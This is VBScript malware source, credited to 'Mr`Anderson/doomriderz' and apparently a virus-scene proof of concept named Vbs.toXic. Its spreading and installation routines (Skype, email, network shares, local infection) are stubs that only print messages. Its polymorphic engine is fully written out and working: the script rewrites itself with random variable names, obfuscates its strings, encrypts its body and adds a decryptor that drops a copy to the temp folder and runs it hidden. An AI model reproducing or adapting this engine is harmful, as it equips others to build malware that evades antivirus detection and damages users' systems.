on error resume next
copyright = "Vbs.toXic.PoC by Mr`Anderson/doomriderz"
Dim fso
Set fso=CreateObject("Scripting.FileSystemObject")
Dim whs
Set whs=CreateObject("WScript.Shell")
mutate
Dim ScriptCode
set tmp=fso.OpenTextFile(self.path)
ScriptCode = tmp.ReadAll
tmp.Close
stop_sb
install
fake_msg
skype_spread
email
netshare
infect_local
sub stop_sb()
wscript.echo "Stopping the Script Blocking service..."
end sub
sub install()
Wscript.Echo "Installing on the system..."
end sub
sub fake_msg()
WScript.Echo "Displaying fake message..."
end sub
sub skype_spread()
Wscript.Echo "Attemping Spread through Skype..."
end sub
sub email()
Wscript.Echo "Emailing..."
end sub
sub netshare()
WScript.Echo "Infecting Network Shares..."
end sub
sub infect_local()
WScript.Echo "Infecting Local Files..."
end sub
function mutate()
On Error Resume next
Dim MUTATE_RATIO
MUTATE_RATIO = 0.05
Dim self
Set self=fso.GetFile(wscript.scriptfullname)
set f=fso.opentextfile(self.path)
Dim virbody
virbody = f.readall
f.close
set f=nothing
virbody = replace(virbody,vbcrlf,chr(10))
virbody = Metamorph(virbody)
virbody = string_morph(virbody)
lines = split(virbody,chr(10))
bCrypt = false
for i=0 to ubound(lines)
if(bCrypt)then
if(lcase(replace(lines(i)," ",""))="endsub")then
bCrypt=false
else
if(left(lines(i),1)="'")then
lines(i)=right(lines(i),len(lines(i))-1)
else
lines(i)="'"&lines(i)
end if
end if
elseif(left(lcase(replace(lines(i)," ","")),len("sub"))="sub")then
randomize
if(rnd<MUTATE_RATIO)then
bCrypt = true
end if
end if
next
virbody = join(lines,chr(10))
virbody = encrypt(virbody)
set f=fso.CreateTextFile(self.path)
f.write virbody
f.close
end function
function encrypt(inline)
randomize
key=1+int(rnd*99)
keyxp = randomkeyxp()
for l=1 to len(inline)
ch = mid(inline,l,1)
ascode = asc(ch)+key
ch = chr(ascode)
inline=left(inline,l-1)&ch&right(inline,len(inline)-l)
next
execute "newkey="&key&keyxp
randomize
decrypt0r = "randomize"&chr(10)& _
"if(rnd<0."&(4+int(rnd*2))&")then"&chr(10)& _
"on error resume next"&chr(10)& _
"set fso=createobject(""scripting.filesystemobject"")"&chr(10)& _
"set f=fso.opentextfile(wscript.scriptfullname)"&chr(10)& _
"body=f.readall"&chr(10)& _
"f.close"&chr(10)& _
"cbody=$ENCBODY$"&chr(10)& _
"key = "&newkey&chr(10)& _
"key=key-"&replace(right(keyxp,len(keyxp)-1),"+",chr(10)&"key=key-")&chr(10)& _
"for l=1 to len(cbody)"&chr(10)& _
"ch = mid(cbody,l,1)"&chr(10)& _
"ascode = asc(ch)-int(key)"&chr(10)& _
"ch = chr(ascode)"&chr(10)& _
"cbody=left(cbody,l-1)&ch&right(cbody,len(cbody)-l)"&chr(10)& _
"next"&chr(10)& _
"tmppath=fso.GetSpecialFolder(2)&""\"&randomword(6,10)&"."&fso.GetExtensionName(fso.GetFile(WScript.ScriptFullName))&""""&chr(10)& _
"set f=fso.createtextfile(tmppath)"&chr(10)& _
"f.write cbody"&chr(10)& _
"f.close"&chr(10)& _
"createobject(""wscript.shell"").run """"""""&Wscript.FullName&"""""" """"""&tmppath&"""""""",0,false"&chr(10)& _
"end if"&chr(10)
decrypt0r = string_morph(decrypt0r)
decrypt0r = replace(decrypt0r,"$ENCBODY$",""""&replace(replace(replace(inline,chr(34),chr(34)&chr(34)),chr(10),"""&chr(10)&"""),chr(13),"""&chr(13)&""")&"""")
decrypt0r = Metamorph(decrypt0r)
encrypt = decrypt0r
end function
function randomkeyxp()
randomize
numxp = 2+int(rnd*8)
for xp=0 to numxp
randomize
if(rnd<0.5 and xp>0)then
op="*"
else
op="+"
end if
randomize
num = 1+int(rnd*10)
randomkeyxp = randomkeyxp & op & num
next
end function
function string_morph(incode)
on error resume next
if(incode="")then exit function
STR_MORPH_RATIO=0.3
l=split(incode,chr(10))
for n=0 to ubound(l)
if(lcase(left(l(n),len("execute")))="execute")then n=n+1
newstring=""
repstring=""
binstring=false
for c=1 to len(l(n))
char=mid(l(n),c,1)
if(binstring)then
if(c<len(l(n)))then
if(char=chr(34))then
nextc=mid(l(n),c+1,1)
if(nextc<>chr(34))then
binstring=false
newstring=newstring&chr(34)
repstring=repstring&chr(34)
last=mid(l(n),c+1,len(l(n))-c)
if(instr(last,chr(34))=0)then
exit for
elseif(nextc=chr(38))then
midstr=left(last,instr(last,chr(34))-1)
if(right(midstr,1)=chr(38))then
newstring=newstring&midstr
repstring=repstring&midstr
end if
c=c+len(midstr)
end if
else
c=c+1
end if
end if
if(binstring)then
newstring=newstring&"%"&asc(char)
repstring=repstring&char
if(char=chr(34))then
repstring=repstring&chr(34)
end if
end if
else
if(char=chr(34))then
newstring=newstring&chr(34)
repstring=repstring&chr(34)
end if
exit for
end if
elseif(char=chr(34))then
binstring=true
newstring=newstring&chr(34)
repstring=repstring&chr(34)
end if
next
morphstring=chr(34)
binstring=false
for c=1 to len(newstring)-1
char=mid(newstring,c,1)
if(char=chr(34))then
binstring=not binstring
if(binstring)then
c=c+1
end if
end if
if(binstring)then
char=mid(newstring,c,1)
if(char="%")then
ascii=mid(newstring,c+1,3)
if(asc(right(ascii,1))<48 or asc(right(ascii,1))>57)then ascii=left(ascii,len(ascii)-1)
ascii=int(ascii)
randomize
if(rnd<STR_MORPH_RATIO)then
morphstring=morphstring&chr(34)&chr(38)&"chr("&ascii&")"&chr(38)&chr(34)
else
morphstring=morphstring&chr(ascii)
if(ascii=34)then
morphstring=morphstring&chr(34)
end if
end if
end if
if(char=chr(34))then
binstring=false
end if
end if
if(not binstring and c<len(newstring))then
midstr=mid(newstring,c+1,instr(mid(newstring,c+1,len(newstring)-c),chr(34))-1)
c=c+len(midstr)
parts=split(midstr,"&")
for m=1 to ubound(parts)-1
parts(m)=replace(parts(m)," ","")
if(len(parts(m))>4)then
flag=lcase(left(parts(m),4))
if(flag="chr(")then
piece=right(parts(m),len(parts(m))-4)
ac=left(piece,instr(piece,")")-1)
ac=int(ac)
morphstring=morphstring&chr(ac)
if(ac=34)then
morphstring=morphstring&chr(34)
end if
else
morphstring=morphstring&chr(34)&chr(38)&parts(m)&chr(38)&chr(34)
end if
end if
next
end if
next
morphstring=morphstring&chr(34)
l(n)=replace(l(n),repstring,morphstring)
next
incode=join(l,chr(10))
string_morph=incode
end function
function Metamorph(code)
on error resume next
Metamorph = code
if len(code) = 0 then exit function
forbiddenwords = " dim if then else elseif and or end wend select case each in is nothing set on error resume next function sub next while do loop for to not true false step rnd err msgbox wscript vbcrlf vbcancel vbexclamation vbyesno vbokcancel vbinformation vbcritical vbquestion vbno vbyes vbok exit execute randomize len right left replace split join asc chr hex dec me mod execute "
codelines = split(code,chr(10))
variables = ""
randomvariables = ""
for lindex=0 to ubound(codelines)
if(left(codelines(lindex),1) = "'") then codelines(lindex) = ""
bWritingVariable = false
bSearch = true
c = ""
newvar=""
offset = 0
codelines(lindex) = codelines(lindex) & " "
for cnum=1 to len(codelines(lindex))+1
if( not bWritingVariable )then lastc = c
c = right(left(codelines(lindex),cnum+offset),1)
if( c = "'" and bSearch )then exit for
if( c = """" and lcase(left(codelines(lindex),len("execute")))<>"execute" )then
bSearch = not bSearch
end if
if( ((asc(c) > 47 and asc(c) < 58) or c="_") and bWritingVariable )then
newvar=newvar & c
elseif( (asc(c) > 64 and asc(c) < 91) or (asc(c) > 96 and asc(c) < 123) )then
if ( bSearch ) then
bWritingVariable = true
newvar=newvar & c
end if
elseif( bWritingVariable )then
bWritingVariable = false
newvar = lcase(newvar)
bCanReplace = (lastc <> "." and (instr(lcase(forbiddenwords)," " & newvar & " ") = 0) and (c<>"(" or instr(lcase(code),"function " & newvar) > 0 or instr(lcase(code),"sub " & newvar) > 0 or instr(replace(lcase(code)," ",""),newvar & "=") > 0 or instr(replace(lcase(code)," ",""),"(" & newvar & ")") > 0))
if( bCanReplace ) then 
varlist = split(variables,";")
bFound = False
for pos=0 to ubound(varlist) step 2
if( varlist(pos) = newvar ) then
bFound = True
exit for
end if
next
if( not bFound ) then
do
rw = randomword(6,10)
loop while( instr(forbiddenwords,lcase(rw))>0 or instr(lcase(variables),lcase(rw))>0 or left(lcase(rw),1) = "h" )
if ( len(variables) = 0 )then
variables = newvar & ";" & rw
else
variables = variables & ";" & newvar & ";" & rw
end if
varlist=split(variables,";")
pos = ubound(varlist)-1
end if
codelines(lindex) = left(codelines(lindex),cnum+offset-len(newvar)-1) & varlist(pos+1) & right(codelines(lindex),len(codelines(lindex))-cnum-offset+1)
offset = offset+len(varlist(pos+1))-len(newvar)
else
oldnewvar=newvar
for ccc=1 to len(newvar)
cr=mid(newvar,ccc,1)
randomize
if(rnd<0.3)then
cr=UCase(cr)
else
cr=LCase(cr)
end if
newvar=left(newvar,ccc-1)&cr&right(newvar,len(newvar)-ccc)
next
codelines(lindex)=replace(codelines(lindex),oldnewvar,newvar)
end if
newvar = ""
end if
next
codelines(lindex) = left(codelines(lindex),len(codelines(lindex))-1)
next
code = join(codelines,chr(10))
if len(code) > 0 then Metamorph = code
end function
Function randomword(min,max)
on error resume next
if ( min > max ) then
mx = max
max = min
min = mx
end if
max = max+1
max = max-min
randomword=""
randomize
namelen = int(rnd*max)+min
for z=1 to namelen
randomize
g=int(rnd*2)+1
randomize
if g=0 then
c=chr(int(rnd*10)+48)
elseif g=1 then
c=chr(int(rnd*26)+65)
else
c=chr(int(rnd*26)+97)
end if
randomword=randomword & c
next
End Function